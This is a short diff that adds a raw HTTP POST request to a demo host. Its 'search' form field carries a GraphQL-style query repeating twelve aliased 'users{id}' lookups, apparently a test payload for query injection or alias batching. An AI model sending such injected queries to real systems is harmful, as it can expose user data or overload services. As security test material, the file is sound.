@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 177
+Connection: close
+
+search={a:%0ausers{id}b:%0ausers{id}c:%0ausers{id}d:%0ausers{id}e:%0ausers{id}f:%0ausers{id}g:%0ausers{id}h:%0ausers{id}i:%0ausers{id}j:%0ausers{id}k:%0ausers{id}l:%0ausers{id}}
